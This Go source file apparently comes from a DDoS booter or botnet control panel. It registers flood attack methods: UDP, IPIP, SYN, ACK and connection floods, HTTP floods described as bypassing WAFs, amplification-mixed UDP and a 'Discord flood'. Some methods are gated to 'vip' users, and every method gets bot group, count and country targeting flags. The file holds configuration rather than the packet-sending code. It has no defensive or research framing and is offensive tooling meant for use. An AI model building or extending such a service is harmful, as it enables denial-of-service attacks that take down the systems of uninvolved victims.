package floods

import "golang.org/x/exp/slices"

var VectorList map[string]*Vector

const (
	FloodUdpPlain uint8 = iota
	FloodIpIpUdp
	FloodUdpRaw
	FloodUdpStd

	FloodTcpSyn
	FloodTcpAck
	FloodTcpWra
	FloodSocket
)

const (
	FloodApiHttp = iota + 1 + FloodSocket
	FloodApiHttpBypass
	FloodApiUdp
	FloodApiTcp
	FloodApiDiscord
)

func initVectors() {
	VectorList = map[string]*Vector{
		"udpplain": {
			ID:          FloodUdpPlain,
			Description: "UDP socket flood",
			Flags:       []uint8{FlagDestinationPort, FlagSourcePort, FlagLength, FlagMinLength, FlagMaxLength, FlagPayload, FlagSleep},
		},

		"ipipudp": {
			ID:          FloodIpIpUdp,
			Description: "IPIP encapsulated UDP flood",
			Flags:       []uint8{FlagDestinationPort, FlagSourcePort, FlagLength, FlagMinLength, FlagMaxLength, FlagPayload, FlagSleep},
		},

		"udpraw": {
			ID:          FloodUdpRaw,
			Description: "UDP RAW flood",
			Flags:       []uint8{FlagDestinationPort, FlagSourcePort, FlagLength, FlagMinLength, FlagMaxLength, FlagPayload, FlagSleep},
		},

		/*"std": {
			ID:          FloodUdpStd,
			Description: "UDP flood with no data randomization",
			Flags:       []uint8{FlagDestinationPort, FlagSourcePort, FlagLength, FlagPayload, FlagSleep},
		},*/

		"syn": {
			ID:          FloodTcpSyn,
			Description: "TCP SYN flood",
			Flags:       []uint8{FlagDestinationPort, FlagSourcePort, FlagSleep, FlagFastOpen},
			Roles:       []string{"vip"},
		},

		"ack": {
			ID:          FloodTcpAck,
			Description: "TCP ACK flood",
			Flags:       []uint8{FlagDestinationPort, FlagSourcePort, FlagLength, FlagMinLength, FlagMaxLength, FlagPayload, FlagSleep},
		},

		"wra": {
			ID:          FloodTcpWra,
			Description: "TCP SYN flood with random OS header traits",
			Flags:       []uint8{FlagDestinationPort, FlagSourcePort, FlagSleep, FlagFastOpen},
			Roles:       []string{"vip"},
		},

		"socket": {
			ID:          FloodSocket,
			Description: "TCP connection flood",
			Flags:       []uint8{FlagDestinationPort, FlagLength, FlagMinLength, FlagMaxLength, FlagPayload, FlagConns, FlagRepeat, FlagSleep},
		},

		"https": {
			ID:          FloodApiHttp,
			Description: "HTTP high rq/s flood",
			Flags:       []uint8{FlagDestinationPort},
			IsL7:        true,
			API:         true,
		},

		"browser": {
			ID:          FloodApiHttpBypass,
			Description: "HTTP flood optimized for bypassing WAFs",
			Flags:       []uint8{FlagDestinationPort},
			IsL7:        true,
			API:         true,
		},

		"udp": {
			ID:          FloodApiUdp,
			Description: "UDP flood mixed with amplifications",
			Flags:       []uint8{FlagDestinationPort},
			IsL7:        false,
			API:         true,
		},

		"tcp": {
			ID:          FloodApiTcp,
			Description: "TCP flood",
			Flags:       []uint8{FlagDestinationPort},
			IsL7:        false,
			API:         true,
		},

		"discord": {
			ID:          FloodApiDiscord,
			Description: "Discord flood",
			Flags:       []uint8{FlagDestinationPort},
			IsL7:        false,
			API:         true,
		},
	}

	// add group, count & country to every method
	appendFlags([]uint8{FlagGroup, FlagCount, FlagCountry}, func(v *Vector) bool { return true })

	// add payload profile flag to methods with payload
	appendFlags([]uint8{FlagPayloadProfile}, func(v *Vector) bool {
		return slices.Contains(v.Flags, FlagPayload)
	})
}

func appendFlags(flags []uint8, cond func(v *Vector) bool) {
	for _, vector := range VectorList {
		if cond(vector) {
			vector.Flags = append(vector.Flags, flags...)
		}
	}
}
